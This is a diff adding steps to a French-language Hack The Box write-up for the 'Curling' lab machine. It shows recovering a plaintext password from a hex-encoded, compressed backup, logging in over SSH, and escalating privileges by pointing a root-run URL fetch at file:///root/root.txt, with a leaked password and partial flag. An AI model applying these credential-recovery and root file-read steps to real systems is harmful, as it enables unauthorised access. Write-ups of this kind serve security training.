@@ -103,9 +103,39 @@ Comme vous pouvez le voir il y'a un fichier password_backup, le fichier user.txt
 
 [![forthebadge made-with-python](https://im.ezgif.com/tmp/ezgif-1-6c0da889e0b9.gif)]
 
+Donc une fois que le fichier a été transférer nous pouvons jouer avec le fichier backup. Alors concrètement si nous regardons le fichier c'est un fichier en hex, nous allons utillisé la commande xxd pour convertir ça en binaire.
 
+    root@Computer:~/htb/writeup/Curling# xxd -r password_backup > file.bin
+    root@Computer:~/htb/writeup/Curling# file file.bin 
+    file.bin: bzip2 compressed data, block size = 900k
+    
+Maintenant si nous regardons le type du fichier c'est un fichier compressé en bzip2, nous allons décompressé ça avec la commande bzip2. Ensuite il faut changer l'extension du fichier.
 
+    root@Computer:~/htb/writeup/Curling# bzip2 -d file
+
+Le fichier a été décompressé avec succès sans aucun problème ensuite nous allons revoir le type du fichier maintenant.
+
+    root@Computer:~/htb/writeup/Curling# mv file.out file.out.tar
+    root@Computer:~/htb/writeup/Curling# tar -xvf file.out.tar
+    extracting : password.txt
+    root@Computer:~/htb/writeup/Curling# cat password.txt
+    5d<wdCbdZu)|hChXll
+    
+Nous avons réussis à chopper le mot de passe de l'utilisateur floris donc on va essayer de se connecter en SSH et de check.
+
+    root@Computer:~/htb/writeup/Curling# ssh floris@10.10.10.150
+    floris@10.10.10.150's password: 
+    [...SNIP...]
+    floris@curling:~$ wc -c user.txt
+    33 user.txt
  
- 
+PrivEsc
+----
+Pour le privesc il y'a rien de bien compliqué il suffit de regarder le dossier admin-area dans /home/floris. Dans le fichier input vous devez simplement modifier la variable par file:///root/root.txt pour lire le fichier root.txt. Et lisez rapidement le fichier report avant que quelqu'un d'autre modifie le fichier input.
 
+file input  :
+url = "file://root/root.txt"
+file output :
+    82c198ab6f[...SNIP...]
+ 
   
